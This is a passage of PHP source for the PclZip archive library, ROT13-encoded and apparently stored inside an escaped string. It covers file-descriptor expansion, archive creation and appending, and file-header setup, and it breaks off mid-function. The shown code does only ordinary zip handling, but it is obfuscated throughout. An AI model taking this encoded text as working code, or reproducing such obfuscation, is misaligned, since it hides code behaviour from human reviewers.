            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR, \"Vainyvq glcr \".trgglcr($i_inyhr).\". Fgevat rkcrpgrq sbe nggevohgr '\".CpyMvcHgvyBcgvbaGrkg($i_xrl).\"'\");
            erghea CpyMvc::reebePbqr();
          }

          $c_svyrqrfpe['pbzzrag'] = $i_inyhr;
        oernx;

        pnfr CPYMVC_NGG_SVYR_ZGVZR :
          vs (!vf_vagrtre($i_inyhr)) {
            CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_NGGEVOHGR_INYHR, \"Vainyvq glcr \".trgglcr($i_inyhr).\". Vagrtre rkcrpgrq sbe nggevohgr '\".CpyMvcHgvyBcgvbaGrkg($i_xrl).\"'\");
            erghea CpyMvc::reebePbqr();
          }

          $c_svyrqrfpe['zgvzr'] = $i_inyhr;
        oernx;

        pnfr CPYMVC_NGG_SVYR_PBAGRAG :
          $c_svyrqrfpe['pbagrag'] = $i_inyhr;
        oernx;

        qrsnhyg :
          // ----- Reebe ybt
          CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE,
		                           \"Haxabja cnenzrgre '\".$i_xrl.\"'\");

          // ----- Erghea
          erghea CpyMvc::reebePbqr();
      }

      // ----- Ybbx sbe znaqngbel bcgvbaf
      vs ($i_erdhrfgrq_bcgvbaf !== snyfr) {
        sbe ($xrl=erfrg($i_erdhrfgrq_bcgvbaf); $xrl=xrl($i_erdhrfgrq_bcgvbaf); $xrl=arkg($i_erdhrfgrq_bcgvbaf)) {
          // ----- Ybbx sbe znaqngbel bcgvba
          vs ($i_erdhrfgrq_bcgvbaf[$xrl] == 'znaqngbel') {
            // ----- Ybbx vs cerfrag
            vs (!vffrg($c_svyr_yvfg[$xrl])) {
              CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Zvffvat znaqngbel cnenzrgre \".CpyMvcHgvyBcgvbaGrkg($xrl).\"(\".$xrl.\")\");
              erghea CpyMvc::reebePbqr();
            }
          }
        }
      }

    // raq sbernpu
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviSvyrQrfpeRkcnaq()
  // Qrfpevcgvba :
  //   Guvf zrgubq ybbx sbe rnpu vgrz bs gur yvfg gb frr vs vgf n svyr, n sbyqre
  //   be n fgevat gb or nqqrq nf svyr. Sbe nal bgure glcr bs svyrf (yvax, bgure)
  //   whfg vtaber gur vgrz.
  //   Gura cercner gur vasbezngvba gung jvyy or fgberq sbe gung svyr.
  //   Jura vgf n sbyqre, rkcnaq gur sbyqre jvgu nyy gur svyrf gung ner va gung
  //   sbyqre (erphefviryl).
  // Cnenzrgref :
  // Erghea Inyhrf :
  //   1 ba fhpprff.
  //   0 ba snvyher.
  // --------------------------------------------------------------------------------
  shapgvba ceviSvyrQrfpeRkcnaq(&$c_svyrqrfpe_yvfg, &$c_bcgvbaf)
  {
    $i_erfhyg=1;

    // ----- Perngr n erfhyg yvfg
    $i_erfhyg_yvfg = neenl();

    // ----- Ybbx rnpu ragel
    sbe ($v=0; $v<fvmrbs($c_svyrqrfpe_yvfg); $v++) {

      // ----- Trg svyrqrfpe
      $i_qrfpe = $c_svyrqrfpe_yvfg[$v];

      // ----- Erqhpr gur svyranzr
      $i_qrfpe['svyranzr'] = CpyMvcHgvyGenafyngrJvaCngu($i_qrfpe['svyranzr'], snyfr);
      $i_qrfpe['svyranzr'] = CpyMvcHgvyCnguErqhpgvba($i_qrfpe['svyranzr']);

      // ----- Ybbx sbe erny svyr be sbyqre
      vs (svyr_rkvfgf($i_qrfpe['svyranzr'])) {
        vs (@vf_svyr($i_qrfpe['svyranzr'])) {
          $i_qrfpe['glcr'] = 'svyr';
        }
        ryfr vs (@vf_qve($i_qrfpe['svyranzr'])) {
          $i_qrfpe['glcr'] = 'sbyqre';
        }
        ryfr vs (@vf_yvax($i_qrfpe['svyranzr'])) {
          // fxvc
          pbagvahr;
        }
        ryfr {
          // fxvc
          pbagvahr;
        }
      }

      // ----- Ybbx sbe fgevat nqqrq nf svyr
      ryfr vs (vffrg($i_qrfpe['pbagrag'])) {
        $i_qrfpe['glcr'] = 'iveghny_svyr';
      }

      // ----- Zvffvat svyr
      ryfr {
        // ----- Reebe ybt
        CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_SVYR, \"Svyr '\".$i_qrfpe['svyranzr'].\"' qbrf abg rkvfg\");

        // ----- Erghea
        erghea CpyMvc::reebePbqr();
      }

      // ----- Pnyphyngr gur fgberq svyranzr
      $guvf->ceviPnyphyngrFgberqSvyranzr($i_qrfpe, $c_bcgvbaf);

      // ----- Nqq gur qrfpevcgbe va erfhyg yvfg
      $i_erfhyg_yvfg[fvmrbs($i_erfhyg_yvfg)] = $i_qrfpe;

      // ----- Ybbx sbe sbyqre
      vs ($i_qrfpe['glcr'] == 'sbyqre') {
        // ----- Yvfg bs vgrzf va sbyqre
        $i_qveyvfg_qrfpe = neenl();
        $i_qveyvfg_ao = 0;
        vs ($i_sbyqre_unaqyre = @bcraqve($i_qrfpe['svyranzr'])) {
          juvyr (($i_vgrz_unaqyre = @ernqqve($i_sbyqre_unaqyre)) !== snyfr) {

            // ----- Fxvc '.' naq '..'
            vs (($i_vgrz_unaqyre == '.') || ($i_vgrz_unaqyre == '..')) {
                pbagvahr;
            }

            // ----- Pbzcbfr gur shyy svyranzr
            $i_qveyvfg_qrfpe[$i_qveyvfg_ao]['svyranzr'] = $i_qrfpe['svyranzr'].'/'.$i_vgrz_unaqyre;

            // ----- Ybbx sbe qvssrerag fgberq svyranzr
            // Orpnhfr gur anzr bs gur sbyqre jnf punatrq, gur anzr bs gur
            // svyrf/fho-sbyqref nyfb punatr
            vs (($i_qrfpe['fgberq_svyranzr'] != $i_qrfpe['svyranzr'])
                 && (!vffrg($c_bcgvbaf[CPYMVC_BCG_ERZBIR_NYY_CNGU]))) {
              vs ($i_qrfpe['fgberq_svyranzr'] != '') {
                $i_qveyvfg_qrfpe[$i_qveyvfg_ao]['arj_shyy_anzr'] = $i_qrfpe['fgberq_svyranzr'].'/'.$i_vgrz_unaqyre;
              }
              ryfr {
                $i_qveyvfg_qrfpe[$i_qveyvfg_ao]['arj_shyy_anzr'] = $i_vgrz_unaqyre;
              }
            }

            $i_qveyvfg_ao++;
          }

          @pybfrqve($i_sbyqre_unaqyre);
        }
        ryfr {
          // GOP : hanoyr gb bcra sbyqre va ernq zbqr
        }

        // ----- Rkcnaq rnpu ryrzrag bs gur yvfg
        vs ($i_qveyvfg_ao != 0) {
          // ----- Rkcnaq
          vs (($i_erfhyg = $guvf->ceviSvyrQrfpeRkcnaq($i_qveyvfg_qrfpe, $c_bcgvbaf)) != 1) {
            erghea $i_erfhyg;
          }

          // ----- Pbapng gur erfhygvat yvfg
          $i_erfhyg_yvfg = neenl_zretr($i_erfhyg_yvfg, $i_qveyvfg_qrfpe);
        }
        ryfr {
        }

        // ----- Serr ybpny neenl
        hafrg($i_qveyvfg_qrfpe);
      }
    }

    // ----- Trg gur erfhyg yvfg
    $c_svyrqrfpe_yvfg = $i_erfhyg_yvfg;

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviPerngr()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviPerngr($c_svyrqrfpe_yvfg, &$c_erfhyg_yvfg, &$c_bcgvbaf)
  {
    $i_erfhyg=1;
    $i_yvfg_qrgnvy = neenl();

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviQvfnoyrZntvpDhbgrf();

    // ----- Bcra gur svyr va jevgr zbqr
    vs (($i_erfhyg = $guvf->ceviBcraSq('jo')) != 1)
    {
      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Nqq gur yvfg bs svyrf
    $i_erfhyg = $guvf->ceviNqqYvfg($c_svyrqrfpe_yvfg, $c_erfhyg_yvfg, $c_bcgvbaf);

    // ----- Pybfr
    $guvf->ceviPybfrSq();

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviFjncOnpxZntvpDhbgrf();

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviNqq()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviNqq($c_svyrqrfpe_yvfg, &$c_erfhyg_yvfg, &$c_bcgvbaf)
  {
    $i_erfhyg=1;
    $i_yvfg_qrgnvy = neenl();

    // ----- Ybbx vs gur nepuvir rkvfgf be vf rzcgl
    vs ((!vf_svyr($guvf->mvcanzr)) || (svyrfvmr($guvf->mvcanzr) == 0))
    {

      // ----- Qb n perngr
      $i_erfhyg = $guvf->ceviPerngr($c_svyrqrfpe_yvfg, $c_erfhyg_yvfg, $c_bcgvbaf);

      // ----- Erghea
      erghea $i_erfhyg;
    }
    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviQvfnoyrZntvpDhbgrf();

    // ----- Bcra gur mvc svyr
    vs (($i_erfhyg=$guvf->ceviBcraSq('eo')) != 1)
    {
      // ----- Zntvp dhbgrf gevpx
      $guvf->ceviFjncOnpxZntvpDhbgrf();

      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Ernq gur prageny qverpgbel vasbezngvba
    $i_prageny_qve = neenl();
    vs (($i_erfhyg = $guvf->ceviErnqRaqPragenyQve($i_prageny_qve)) != 1)
    {
      $guvf->ceviPybfrSq();
      $guvf->ceviFjncOnpxZntvpDhbgrf();
      erghea $i_erfhyg;
    }

    // ----- Tb gb ortvaavat bs Svyr
    @erjvaq($guvf->mvc_sq);

    // ----- Perngrf n grzcbenel svyr
    $i_mvc_grzc_anzr = CPYMVC_GRZCBENEL_QVE.havdvq('cpymvc-').'.gzc';

    // ----- Bcra gur grzcbenel svyr va jevgr zbqr
    vs (($i_mvc_grzc_sq = @sbcra($i_mvc_grzc_anzr, 'jo')) == 0)
    {
      $guvf->ceviPybfrSq();
      $guvf->ceviFjncOnpxZntvpDhbgrf();

      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Hanoyr gb bcra grzcbenel svyr \''.$i_mvc_grzc_anzr.'\' va ovanel jevgr zbqr');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Pbcl gur svyrf sebz gur nepuvir gb gur grzcbenel svyr
    // GOP : Urer V fubhyq orggre nccraq gur svyr naq tb onpx gb renfr gur prageny qve
    $i_fvmr = $i_prageny_qve['bssfrg'];
    juvyr ($i_fvmr != 0)
    {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = sernq($guvf->mvc_sq, $i_ernq_fvmr);
      @sjevgr($i_mvc_grzc_sq, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Fjnc gur svyr qrfpevcgbe
    // Urer vf n gevpx : V fjnc gur grzcbenel sq jvgu gur mvc sq, va beqre gb hfr
    // gur sbyybjvat zrgubqf ba gur grzcbenel svy naq abg gur erny nepuvir
    $i_fjnc = $guvf->mvc_sq;
    $guvf->mvc_sq = $i_mvc_grzc_sq;
    $i_mvc_grzc_sq = $i_fjnc;

    // ----- Nqq gur svyrf
    $i_urnqre_yvfg = neenl();
    vs (($i_erfhyg = $guvf->ceviNqqSvyrYvfg($c_svyrqrfpe_yvfg, $i_urnqre_yvfg, $c_bcgvbaf)) != 1)
    {
      spybfr($i_mvc_grzc_sq);
      $guvf->ceviPybfrSq();
      @hayvax($i_mvc_grzc_anzr);
      $guvf->ceviFjncOnpxZntvpDhbgrf();

      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Fgber gur bssfrg bs gur prageny qve
    $i_bssfrg = @sgryy($guvf->mvc_sq);

    // ----- Pbcl gur oybpx bs svyr urnqref sebz gur byq nepuvir
    $i_fvmr = $i_prageny_qve['fvmr'];
    juvyr ($i_fvmr != 0)
    {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = @sernq($i_mvc_grzc_sq, $i_ernq_fvmr);
      @sjevgr($guvf->mvc_sq, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Perngr gur Prageny Qve svyrf urnqre
    sbe ($v=0, $i_pbhag=0; $v<fvmrbs($i_urnqre_yvfg); $v++)
    {
      // ----- Perngr gur svyr urnqre
      vs ($i_urnqre_yvfg[$v]['fgnghf'] == 'bx') {
        vs (($i_erfhyg = $guvf->ceviJevgrPragenySvyrUrnqre($i_urnqre_yvfg[$v])) != 1) {
          spybfr($i_mvc_grzc_sq);
          $guvf->ceviPybfrSq();
          @hayvax($i_mvc_grzc_anzr);
          $guvf->ceviFjncOnpxZntvpDhbgrf();

          // ----- Erghea
          erghea $i_erfhyg;
        }
        $i_pbhag++;
      }

      // ----- Genafsbez gur urnqre gb n 'hfnoyr' vasb
      $guvf->ceviPbairegUrnqre2SvyrVasb($i_urnqre_yvfg[$v], $c_erfhyg_yvfg[$v]);
    }

    // ----- Mvc svyr pbzzrag
    $i_pbzzrag = $i_prageny_qve['pbzzrag'];
    vs (vffrg($c_bcgvbaf[CPYMVC_BCG_PBZZRAG])) {
      $i_pbzzrag = $c_bcgvbaf[CPYMVC_BCG_PBZZRAG];
    }
    vs (vffrg($c_bcgvbaf[CPYMVC_BCG_NQQ_PBZZRAG])) {
      $i_pbzzrag = $i_pbzzrag.$c_bcgvbaf[CPYMVC_BCG_NQQ_PBZZRAG];
    }
    vs (vffrg($c_bcgvbaf[CPYMVC_BCG_CERCRAQ_PBZZRAG])) {
      $i_pbzzrag = $c_bcgvbaf[CPYMVC_BCG_CERCRAQ_PBZZRAG].$i_pbzzrag;
    }

    // ----- Pnyphyngr gur fvmr bs gur prageny urnqre
    $i_fvmr = @sgryy($guvf->mvc_sq)-$i_bssfrg;

    // ----- Perngr gur prageny qve sbbgre
    vs (($i_erfhyg = $guvf->ceviJevgrPragenyUrnqre($i_pbhag+$i_prageny_qve['ragevrf'], $i_fvmr, $i_bssfrg, $i_pbzzrag)) != 1)
    {
      // ----- Erfrg gur svyr yvfg
      hafrg($i_urnqre_yvfg);
      $guvf->ceviFjncOnpxZntvpDhbgrf();

      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Fjnc onpx gur svyr qrfpevcgbe
    $i_fjnc = $guvf->mvc_sq;
    $guvf->mvc_sq = $i_mvc_grzc_sq;
    $i_mvc_grzc_sq = $i_fjnc;

    // ----- Pybfr
    $guvf->ceviPybfrSq();

    // ----- Pybfr gur grzcbenel svyr
    @spybfr($i_mvc_grzc_sq);

    // ----- Zntvp dhbgrf gevpx
    $guvf->ceviFjncOnpxZntvpDhbgrf();

    // ----- Qryrgr gur mvc svyr
    // GOP : V fubhyq grfg gur erfhyg ...
    @hayvax($guvf->mvcanzr);

    // ----- Eranzr gur grzcbenel svyr
    // GOP : V fubhyq grfg gur erfhyg ...
    //@eranzr($i_mvc_grzc_anzr, $guvf->mvcanzr);
    CpyMvcHgvyEranzr($i_mvc_grzc_anzr, $guvf->mvcanzr);

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviBcraSq()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // --------------------------------------------------------------------------------
  shapgvba ceviBcraSq($c_zbqr)
  {
    $i_erfhyg=1;

    // ----- Ybbx vs nyernql bcra
    vs ($guvf->mvc_sq != 0)
    {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Mvc svyr \''.$guvf->mvcanzr.'\' nyernql bcra');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Bcra gur mvc svyr
    vs (($guvf->mvc_sq = @sbcra($guvf->mvcanzr, $c_zbqr)) == 0)
    {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Hanoyr gb bcra nepuvir \''.$guvf->mvcanzr.'\' va '.$c_zbqr.' zbqr');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviPybfrSq()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // --------------------------------------------------------------------------------
  shapgvba ceviPybfrSq()
  {
    $i_erfhyg=1;

    vs ($guvf->mvc_sq != 0)
      @spybfr($guvf->mvc_sq);
    $guvf->mvc_sq = 0;

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviNqqYvfg()
  // Qrfpevcgvba :
  //   $c_nqq_qve naq $c_erzbir_qve jvyy tvir gur novyvgl gb zrzbevmr n cngu juvpu vf
  //   qvssrerag sebz gur erny cngu bs gur svyr. Guvf vf hfrshy vs lbh jnag gb unir CpyGne
  //   ehaavat va nal qverpgbel, naq zrzbevmr eryngvir cngu sebz na bgure qverpgbel.
  // Cnenzrgref :
  //   $c_yvfg : Na neenl pbagnvavat gur svyr be qverpgbel anzrf gb nqq va gur gne
  //   $c_erfhyg_yvfg : yvfg bs nqqrq svyrf jvgu gurve cebcregvrf (fcrpvnyyl gur fgnghf svryq)
  //   $c_nqq_qve : Cngu gb nqq va gur svyranzr cngu nepuvirq
  //   $c_erzbir_qve : Cngu gb erzbir va gur svyranzr cngu nepuvirq
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
//  shapgvba ceviNqqYvfg($c_yvfg, &$c_erfhyg_yvfg, $c_nqq_qve, $c_erzbir_qve, $c_erzbir_nyy_qve, &$c_bcgvbaf)
  shapgvba ceviNqqYvfg($c_svyrqrfpe_yvfg, &$c_erfhyg_yvfg, &$c_bcgvbaf)
  {
    $i_erfhyg=1;

    // ----- Nqq gur svyrf
    $i_urnqre_yvfg = neenl();
    vs (($i_erfhyg = $guvf->ceviNqqSvyrYvfg($c_svyrqrfpe_yvfg, $i_urnqre_yvfg, $c_bcgvbaf)) != 1)
    {
      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Fgber gur bssfrg bs gur prageny qve
    $i_bssfrg = @sgryy($guvf->mvc_sq);

    // ----- Perngr gur Prageny Qve svyrf urnqre
    sbe ($v=0,$i_pbhag=0; $v<fvmrbs($i_urnqre_yvfg); $v++)
    {
      // ----- Perngr gur svyr urnqre
      vs ($i_urnqre_yvfg[$v]['fgnghf'] == 'bx') {
        vs (($i_erfhyg = $guvf->ceviJevgrPragenySvyrUrnqre($i_urnqre_yvfg[$v])) != 1) {
          // ----- Erghea
          erghea $i_erfhyg;
        }
        $i_pbhag++;
      }

      // ----- Genafsbez gur urnqre gb n 'hfnoyr' vasb
      $guvf->ceviPbairegUrnqre2SvyrVasb($i_urnqre_yvfg[$v], $c_erfhyg_yvfg[$v]);
    }

    // ----- Mvc svyr pbzzrag
    $i_pbzzrag = '';
    vs (vffrg($c_bcgvbaf[CPYMVC_BCG_PBZZRAG])) {
      $i_pbzzrag = $c_bcgvbaf[CPYMVC_BCG_PBZZRAG];
    }

    // ----- Pnyphyngr gur fvmr bs gur prageny urnqre
    $i_fvmr = @sgryy($guvf->mvc_sq)-$i_bssfrg;

    // ----- Perngr gur prageny qve sbbgre
    vs (($i_erfhyg = $guvf->ceviJevgrPragenyUrnqre($i_pbhag, $i_fvmr, $i_bssfrg, $i_pbzzrag)) != 1)
    {
      // ----- Erfrg gur svyr yvfg
      hafrg($i_urnqre_yvfg);

      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviNqqSvyrYvfg()
  // Qrfpevcgvba :
  // Cnenzrgref :
  //   $c_svyrqrfpe_yvfg : Na neenl pbagnvavat gur svyr qrfpevcgvba
  //                      be qverpgbel anzrf gb nqq va gur mvc
  //   $c_erfhyg_yvfg : yvfg bs nqqrq svyrf jvgu gurve cebcregvrf (fcrpvnyyl gur fgnghf svryq)
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviNqqSvyrYvfg($c_svyrqrfpe_yvfg, &$c_erfhyg_yvfg, &$c_bcgvbaf)
  {
    $i_erfhyg=1;
    $i_urnqre = neenl();

    // ----- Erphcrengr gur pheerag ahzore bs ryg va yvfg
    $i_ao = fvmrbs($c_erfhyg_yvfg);

    // ----- Ybbc ba gur svyrf
    sbe ($w=0; ($w<fvmrbs($c_svyrqrfpe_yvfg)) && ($i_erfhyg==1); $w++) {
      // ----- Sbezng gur svyranzr
      $c_svyrqrfpe_yvfg[$w]['svyranzr']
      = CpyMvcHgvyGenafyngrJvaCngu($c_svyrqrfpe_yvfg[$w]['svyranzr'], snyfr);


      // ----- Fxvc rzcgl svyr anzrf
      // GOP : Pna guvf or cbffvoyr ? abg purpxrq va QrfpeCnefrNgg ?
      vs ($c_svyrqrfpe_yvfg[$w]['svyranzr'] == \"\") {
        pbagvahr;
      }

      // ----- Purpx gur svyranzr
      vs (   ($c_svyrqrfpe_yvfg[$w]['glcr'] != 'iveghny_svyr')
          && (!svyr_rkvfgf($c_svyrqrfpe_yvfg[$w]['svyranzr']))) {
        CpyMvc::ceviReebeYbt(CPYMVC_REE_ZVFFVAT_SVYR, \"Svyr '\".$c_svyrqrfpe_yvfg[$w]['svyranzr'].\"' qbrf abg rkvfg\");
        erghea CpyMvc::reebePbqr();
      }

      // ----- Ybbx vs vg vf n svyr be n qve jvgu ab nyy cngu erzbir bcgvba
      // be n qve jvgu nyy vgf cngu erzbirq
//      vs (   (vf_svyr($c_svyrqrfpe_yvfg[$w]['svyranzr']))
//          || (   vf_qve($c_svyrqrfpe_yvfg[$w]['svyranzr'])
      vs (   ($c_svyrqrfpe_yvfg[$w]['glcr'] == 'svyr')
          || ($c_svyrqrfpe_yvfg[$w]['glcr'] == 'iveghny_svyr')
          || (   ($c_svyrqrfpe_yvfg[$w]['glcr'] == 'sbyqre')
              && (   !vffrg($c_bcgvbaf[CPYMVC_BCG_ERZBIR_NYY_CNGU])
                  || !$c_bcgvbaf[CPYMVC_BCG_ERZBIR_NYY_CNGU]))
          ) {

        // ----- Nqq gur svyr
        $i_erfhyg = $guvf->ceviNqqSvyr($c_svyrqrfpe_yvfg[$w], $i_urnqre,
                                       $c_bcgvbaf);
        vs ($i_erfhyg != 1) {
          erghea $i_erfhyg;
        }

        // ----- Fgber gur svyr vasbf
        $c_erfhyg_yvfg[$i_ao++] = $i_urnqre;
      }
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviNqqSvyr()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviNqqSvyr($c_svyrqrfpe, &$c_urnqre, &$c_bcgvbaf)
  {
    $i_erfhyg=1;

    // ----- Jbexvat inevnoyr
    $c_svyranzr = $c_svyrqrfpe['svyranzr'];

    // GOP : Nyernql qbar va gur svyrNgg purpx ... ?
    vs ($c_svyranzr == \"\") {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_VAINYVQ_CNENZRGRE, \"Vainyvq svyr yvfg cnenzrgre (vainyvq be rzcgl yvfg)\");

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Ybbx sbe n fgberq qvssrerag svyranzr
    /* GOP : Erzbirq
    vs (vffrg($c_svyrqrfpe['fgberq_svyranzr'])) {
      $i_fgberq_svyranzr = $c_svyrqrfpe['fgberq_svyranzr'];
    }
    ryfr {
      $i_fgberq_svyranzr = $c_svyrqrfpe['fgberq_svyranzr'];
    }
    */

    // ----- Frg gur svyr cebcregvrf
    pyrnefgngpnpur();
    $c_urnqre['irefvba'] = 20;
    $c_urnqre['irefvba_rkgenpgrq'] = 10;
    $c_urnqre['synt'] = 0;
    $c_urnqre['pbzcerffvba'] = 0;
    $c_urnqre['pep'] = 0;
    $c_urnqre['pbzcerffrq_fvmr'] = 0;
    $c_urnqre['svyranzr_yra'] = fgeyra($c_svyranzr);
    $c_urnqre['rkgen_yra'] = 0;
    $c_urnqre['qvfx'] = 0;
    $c_urnqre['vagreany'] = 0;
    $c_urnqre['bssfrg'] = 0;
    $c_urnqre['svyranzr'] = $c_svyranzr;
// GOP : Erzbirq    $c_urnqre['fgberq_svyranzr'] = $i_fgberq_svyranzr;
    $c_urnqre['fgberq_svyranzr'] = $c_svyrqrfpe['fgberq_svyranzr'];
    $c_urnqre['rkgen'] = '';
    $c_urnqre['fgnghf'] = 'bx';
    $c_urnqre['vaqrk'] = -1;

    // ----- Ybbx sbe erthyne svyr
    vs ($c_svyrqrfpe['glcr']=='svyr') {
      $c_urnqre['rkgreany'] = 0k00000000;
      $c_urnqre['fvmr'] = svyrfvmr($c_svyranzr);
    }

    // ----- Ybbx sbe erthyne sbyqre
    ryfr vs ($c_svyrqrfpe['glcr']=='sbyqre') {
      $c_urnqre['rkgreany'] = 0k00000010;
      $c_urnqre['zgvzr'] = svyrzgvzr($c_svyranzr);
      $c_urnqre['fvmr'] = svyrfvmr($c_svyranzr);
    }

    // ----- Ybbx sbe iveghny svyr
    ryfr vs ($c_svyrqrfpe['glcr'] == 'iveghny_svyr') {
      $c_urnqre['rkgreany'] = 0k00000000;
      $c_urnqre['fvmr'] = fgeyra($c_svyrqrfpe['pbagrag']);
    }


    // ----- Ybbx sbe svyrgvzr
    vs (vffrg($c_svyrqrfpe['zgvzr'])) {
      $c_urnqre['zgvzr'] = $c_svyrqrfpe['zgvzr'];
    }
    ryfr vs ($c_svyrqrfpe['glcr'] == 'iveghny_svyr') {
      $c_urnqre['zgvzr'] = gvzr();
    }
    ryfr {
      $c_urnqre['zgvzr'] = svyrzgvzr($c_svyranzr);
    }

    // ------ Ybbx sbe svyr pbzzrag
    vs (vffrg($c_svyrqrfpe['pbzzrag'])) {
      $c_urnqre['pbzzrag_yra'] = fgeyra($c_svyrqrfpe['pbzzrag']);
      $c_urnqre['pbzzrag'] = $c_svyrqrfpe['pbzzrag'];
    }
    ryfr {
      $c_urnqre['pbzzrag_yra'] = 0;
      $c_urnqre['pbzzrag'] = '';
    }

    // ----- Ybbx sbe cer-nqq pnyyonpx
    vs (vffrg($c_bcgvbaf[CPYMVC_PO_CER_NQQ])) {

      // ----- Trarengr n ybpny vasbezngvba
      $i_ybpny_urnqre = neenl();
      $guvf->ceviPbairegUrnqre2SvyrVasb($c_urnqre, $i_ybpny_urnqre);

      // ----- Pnyy gur pnyyonpx
      // Urer V qb abg hfr pnyy_hfre_shap() orpnhfr V arrq gb fraq n ersrerapr gb gur
      // urnqre.
      $i_erfhyg = $c_bcgvbaf[CPYMVC_PO_CER_NQQ](CPYMVC_PO_CER_NQQ, $i_ybpny_urnqre);
      vs ($i_erfhyg == 0) {
        // ----- Punatr gur svyr fgnghf
        $c_urnqre['fgnghf'] = \"fxvccrq\";
        $i_erfhyg = 1;
      }

      // ----- Hcqngr gur vasbezngvba
      // Bayl fbzr svryqf pna or zbqvsvrq
      vs ($c_urnqre['fgberq_svyranzr'] != $i_ybpny_urnqre['fgberq_svyranzr']) {
        $c_urnqre['fgberq_svyranzr'] = CpyMvcHgvyCnguErqhpgvba($i_ybpny_urnqre['fgberq_svyranzr']);
      }
    }

    // ----- Ybbx sbe rzcgl fgberq svyranzr
    vs ($c_urnqre['fgberq_svyranzr'] == \"\") {
      $c_urnqre['fgnghf'] = \"svygrerq\";
    }

    // ----- Purpx gur cngu yratgu
    vs (fgeyra($c_urnqre['fgberq_svyranzr']) > 0kSS) {
      $c_urnqre['fgnghf'] = 'svyranzr_gbb_ybat';
    }

    // ----- Ybbx vs ab reebe, be svyr abg fxvccrq
    vs ($c_urnqre['fgnghf'] == 'bx') {

      // ----- Ybbx sbe n svyr
      vs ($c_svyrqrfpe['glcr'] == 'svyr') {
        // ----- Ybbx sbe hfvat grzcbenel svyr gb mvc
        vs ( (!vffrg($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_BSS]))
            && (vffrg($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_BA])
                || (vffrg($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ])
                    && ($c_bcgvbaf[CPYMVC_BCG_GRZC_SVYR_GUERFUBYQ] <= $c_urnqre['fvmr'])) ) ) {
          $i_erfhyg = $guvf->ceviNqqSvyrHfvatGrzcSvyr($c_svyrqrfpe, $c_urnqre, $c_bcgvbaf);
          vs ($i_erfhyg < CPYMVC_REE_AB_REEBE) {
            erghea $i_erfhyg;
          }
        }

        // ----- Hfr \"va zrzbel\" mvc nytb
        ryfr {

        // ----- Bcra gur fbhepr svyr
        vs (($i_svyr = @sbcra($c_svyranzr, \"eo\")) == 0) {
          CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, \"Hanoyr gb bcra svyr '$c_svyranzr' va ovanel ernq zbqr\");
          erghea CpyMvc::reebePbqr();
        }

        // ----- Ernq gur svyr pbagrag
